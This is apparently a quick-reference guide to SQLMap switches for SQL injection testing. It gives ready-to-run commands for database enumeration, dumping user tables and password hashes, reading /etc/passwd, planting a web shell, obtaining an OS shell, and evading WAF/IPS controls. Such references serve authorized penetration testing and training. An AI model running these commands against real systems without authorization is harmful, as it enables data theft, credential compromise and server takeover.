# Conducting Attacks

SQLMap is a comprehensive penetration testing tool designed to automate the detection and exploitation of SQL injection vulnerabilities, ranging from basic data extraction to taking over the underlying operating system. This article serves as a quick reference for running various exploitation techniques using SQLMap switches and options.

## Initial Discovery and Testing

Before performing complex attacks, the first step is always to confirm that a web application parameter is vulnerable to SQL injection.

### Running a Basic Scan

To test a target URL with a GET parameter (e.g., `id=1`), use the `-u` or `--url` option. Adding `--batch` skips interactive prompts by selecting default options automatically:

```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

**Outcome:** SQLMap attempts to identify the vulnerable parameter (`id`), the type of SQL injection (e.g., Boolean-based, Error-based, UNION, or Time-based), and fingerprints the back-end DBMS.

### Specifying Complex HTTP Requests&#xD;

If the vulnerability lies in POST data, headers, or a complex request structure, alternative methods must be used:

<table><thead><tr><th width="183">Scenario</th><th width="142">Switch</th><th>Command Example</th></tr></thead><tbody><tr><td>POST Request Data</td><td><code>--data</code></td><td><code>sqlmap 'http://www.example.com/' --data 'uid=1&#x26;name=test'</code></td></tr><tr><td>Full HTTP Request</td><td><code>-r</code></td><td><code>sqlmap -r req.txt</code> (Loads headers, data, and URL from a file captured via proxy or browser dev tools)</td></tr><tr><td>Cookie Injection</td><td><code>--cookie</code> or <code>-H</code></td><td><code>sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'</code></td></tr><tr><td>JSON/XML Body</td><td><code>-r</code> or <code>--data</code></td><td>Used when the POST body is JSON or XML format</td></tr></tbody></table>

***

## Basic Database Enumeration

Once an injection point is confirmed, basic enumeration retrieves core information about the DBMS and its contents.

### Retrieving Core Information&#xD;

Combine switches to quickly fetch the banner, current user, database, and check for DBA privileges:

<table><thead><tr><th width="190">Target</th><th width="229">Switch</th><th>Command Example</th></tr></thead><tbody><tr><td>All Core Info</td><td><code>--banner</code>, <code>--current-user</code>, <code>--current-db</code>, <code>--is-dba</code></td><td><code>sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba</code></td></tr><tr><td>Dump All Content</td><td><code>--dump-all</code></td><td><code>sqlmap -u "http://www.example.com/?id=1" --dump-all --exclude-sysdbs</code></td></tr><tr><td>Automated Full Run</td><td><code>--all --batch</code></td><td><code>sqlmap -u "http://www.example.com/?id=1" --all --batch</code></td></tr></tbody></table>

### Extracting Data from Tables

To retrieve tables from a specific database (`testdb`) and then dump the contents of an identified table (`users`):

<table><thead><tr><th width="188">Action</th><th width="186">Switch</th><th>Command Example</th></tr></thead><tbody><tr><td>List Tables</td><td><code>-D</code> (database), <code>--tables</code></td><td><code>sqlmap -u "http://www.example.com/?id=1" --tables -D testdb</code></td></tr><tr><td>Dump Table</td><td><code>--dump</code>, <code>-T</code> (table), <code>-D</code> (database)</td><td><code>sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb</code></td></tr><tr><td>Dump Specific Columns</td><td><code>-C</code> (columns)</td><td><code>sqlmap --dump -T users -D testdb -C name,surname</code></td></tr><tr><td>Dump Specific Rows</td><td><code>--where</code></td><td><code>sqlmap --dump -T users -D testdb --where="name LIKE 'f%'"</code> </td></tr></tbody></table>

***

Advanced Enumeration and Credential Attacks


Advanced attacks focus on identifying database structure, searching for specific sensitive content, and cracking passwords.

### Structural and Content Search

Advanced attacks focus on identifying database structure, searching for specific sensitive content, and cracking passwords.

### Structural and Content Search

<table><thead><tr><th width="159">Action</th><th width="126">Switch</th><th>Command Example</th></tr></thead><tbody><tr><td>DB Schema</td><td><code>--schema</code></td><td><code>sqlmap -u "http://www.example.com/?id=1" --schema</code></td></tr><tr><td>Search Tables</td><td><code>--search -T</code></td><td><code>sqlmap -u "http://www.example.com/?id=1" --search -T user</code></td></tr><tr><td>Search Columns</td><td><code>--search -C</code></td><td><code>sqlmap -u "http://www.example.com/?id=1" --search -C pass</code></td></tr></tbody></table>

### Password Cracking&#xD;

SQLMap has automated capabilities to identify hashes and perform dictionary attacks against application user passwords and database system user passwords.

<table><thead><tr><th width="167">Target</th><th width="180">Switch</th><th>Command Example</th></tr></thead><tbody><tr><td>Application Users</td><td><code>--dump</code> (on table containing hashes)</td><td><code>sqlmap --dump -T users -D master</code> (SQLMap prompts user to crack)</td></tr><tr><td>DB System Users</td><td><code>--passwords</code></td><td><code>sqlmap -u "http://www.example.com/?id=1" --passwords</code></td></tr></tbody></table>

***

## Host System Exploitation

If the current database user has the necessary privileges (DBA and specific file privileges), SQLMap can be leveraged to interact with the underlying operating system.

### Checking Privileges

Check if the database user has DBA rights, which greatly increases the probability of having file system privileges:

```bash
sqlmap -u "http://www.example.com/?id=1" --is-dba
```

### File System Interaction

<table><thead><tr><th width="158">Action</th><th width="167">Switch</th><th>Command Example</th></tr></thead><tbody><tr><td>Read Remote File</td><td><code>--file-read</code></td><td><code>sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"</code></td></tr><tr><td>Write Remote File</td><td><code>--file-write</code> and <code>--file-dest</code></td><td><code>sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"</code></td></tr></tbody></table>

Obtaining an OS Shell

The `--os-shell` option attempts to gain an interactive remote shell using various techniques (like planting a web shell or exploiting system procedures like `xp_cmdshell` in MSSQL). It may require manually specifying the language (`--data` or prompting) and technique used for injection:

```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell --technique=E
```

{% hint style="info" %}
#### Technique E

The above command uses the Error-based (E) technique for potentially faster output.
{% endhint %}

***

Attack Tuning and Evasion


When initial scanning fails or specific bypasses are required, attack tuning options can be employed.

### Controlling Techniques and Payload Scope

<table><thead><tr><th width="197">Action</th><th width="152">Switch</th><th>Description</th></tr></thead><tbody><tr><td>Specify Techniques</td><td><code>--technique=BEU</code></td><td>Only test Boolean, Error, and UNION query methods</td></tr><tr><td>Increase Thoroughness</td><td><code>--level=5</code></td><td>Increases tested payload sets (up to 7,865 payloads at max settings)</td></tr><tr><td>Enable Dangerous Payloads</td><td><code>--risk=3</code></td><td>Required to test dangerous payloads, like <code>OR</code> clauses (useful for login forms)</td></tr><tr><td>Custom Boundaries</td><td><code>--prefix</code> / <code>--suffix</code></td><td>Overrides default payload wrapping mechanisms</td></tr></tbody></table>

### Bypassing Security Controls (WAF/IPS)

<table><thead><tr><th width="151">Action</th><th width="282">Switch</th><th>Purpose</th></tr></thead><tbody><tr><td>WAF Evasion</td><td><code>--tamper=script_name</code></td><td>Uses Python scripts to encode or manipulate payloads (e.g., <code>--tamper=space2comment,randomcase</code>)</td></tr><tr><td>Random User-Agent</td><td><code>--random-agent</code></td><td>Prevents blacklisting of the default SQLMap signature</td></tr><tr><td>CSRF Token Handling</td><td><code>--csrf-token</code></td><td>Automatically fetches and updates anti-CSRF token values</td></tr><tr><td>Traffic Interception</td><td><code>--proxy="http://127.0.0.1:8080"</code></td><td>Routes all traffic through an external proxy (e.g., Burp Suite) for manual inspection</td></tr></tbody></table>
